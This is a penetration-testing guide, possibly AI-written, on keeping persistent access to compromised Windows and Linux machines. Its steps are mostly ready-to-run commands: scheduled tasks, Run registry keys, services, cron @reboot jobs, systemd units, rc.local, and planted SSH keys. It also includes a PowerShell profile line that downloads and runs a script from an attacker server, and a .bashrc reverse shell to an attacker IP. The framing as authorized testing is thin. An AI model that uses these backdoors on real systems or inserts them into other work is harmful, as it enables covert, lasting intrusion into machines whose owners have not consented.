Maintaining access in a Windows system as part of a penetration test often involves setting up persistent methods to re-enter the system for authorized testing purposes. Here are some methods commonly used by penetration testers to maintain access in a controlled and responsible way:
1. Using Scheduled Tasks for Persistence

A scheduled task can be created to execute a script or backdoor at regular intervals or upon system startup.

Steps:

    Open a command prompt with administrative privileges.
    Run the following command to create a scheduled task:

    schtasks /create /tn "MaintenanceTask" /tr "C:\path\to\your\payload.exe" /sc onlogon /ru System

        \tn "MaintenanceTask": The name of the task.
        \tr "C:\path\to\your\payload.exe": The path to the executable file to run.
        /sc onlogon: Configures the task to trigger at every user logon.
        /ru System: Runs the task with System privileges.

2. Registry-based Persistence

Adding a payload to the Windows Registry can make it execute upon user logon.

Steps:

    Open the Registry Editor or use a command prompt.
    Add a key to the Run registry entry:

    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MaintenanceKey /t REG_SZ /d "C:\path\to\your\payload.exe" /f

        This runs your payload whenever the user logs on.
        Important: Using HKCU sets it for the current user; use HKLM for all users.

3. Creating a Service for Persistence

Create a Windows service to run a payload on system startup.

Steps:

    Use sc.exe to create a service:

    sc create MaintenanceService binPath= "C:\path\to\your\payload.exe" start= auto

        This creates a service named MaintenanceService that runs the payload at startup.
        Note: Ensure you have the necessary permissions to create services.

4. Utilizing PowerShell Profiles

A PowerShell profile script can be configured to run custom commands whenever PowerShell starts.

Steps:

    Edit the PowerShell profile (located at C:\Users\<username>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1).

    Add commands to load payloads or connect to a remote server.

    # Add a reverse shell or other code for persistence
    Invoke-WebRequest -Uri http://attacker-server.com/payload.ps1 -OutFile $env:temp\payload.ps1
    . $env:temp\payload.ps1

5. Maintaining Remote Access via VPN

If the Windows system is part of a virtual lab environment, maintaining access through a VPN can allow secure, authorized re-entry:

    Configure the system to connect to a VPN server with remote access tools (such as RDP or SSH).
    Schedule a VPN reconnection task in case of disconnection.

Important Notes:

    Authorization: Only set up persistence on systems where you have explicit permission.
    Cleanup: Ensure to remove any persistence mechanisms after the testing phase.
    Avoid Detection: Always respect the boundaries and monitoring in place on the system.

In Linux, setting up persistent access during authorized penetration testing typically involves creating methods that automatically execute a script, backdoor, or reverse shell upon system reboot or user login. Here are several common ways to maintain access on a Linux system:
1. Using Cron Jobs for Persistence

Cron jobs can be set up to execute commands at specific intervals or upon reboot.

Steps:

    Edit the root crontab:

sudo crontab -e

Add a line to set up a cron job that runs a payload script every minute or at reboot:

    @reboot /path/to/your/payload.sh
    * * * * * /path/to/your/payload.sh

        @reboot will run the payload on system startup.
        * * * * * will run the payload every minute.

2. Creating a Systemd Service

Systemd services allow you to configure scripts or payloads to run as background services on startup.

Steps:

    Create a service file in /etc/systemd/system/:

sudo nano /etc/systemd/system/persistence.service

Add the following content to configure the service:

[Unit]
Description=Persistence Service

[Service]
ExecStart=/path/to/your/payload.sh
Restart=always

[Install]
WantedBy=multi-user.target

Enable and start the service:

    sudo systemctl enable persistence.service
    sudo systemctl start persistence.service

3. Using rc.local for Legacy Startup Scripts

Some systems still support /etc/rc.local, a legacy method to execute scripts on boot.

Steps:

    Open /etc/rc.local in an editor:

sudo nano /etc/rc.local

Add your payload before the exit 0 line:

/path/to/your/payload.sh &

Make /etc/rc.local executable:

    sudo chmod +x /etc/rc.local

4. Adding a Persistent Reverse Shell in Bash Profile

By adding commands to a user’s .bashrc or .bash_profile, you can execute a reverse shell every time they open a new shell session.

Steps:

    Edit the .bashrc file:

nano ~/.bashrc

Add a line to initiate a reverse shell:

    bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1

    Save and close the file. This will run every time the user logs in.

5. Using SSH Key-based Access

Setting up an SSH key in the authorized keys file can allow you to access the system remotely without a password.

Steps:

    Generate an SSH key pair on your attacking machine:

ssh-keygen -t rsa -b 4096

Copy the public key to the target’s ~/.ssh/authorized_keys:

echo "your_public_key" >> ~/.ssh/authorized_keys
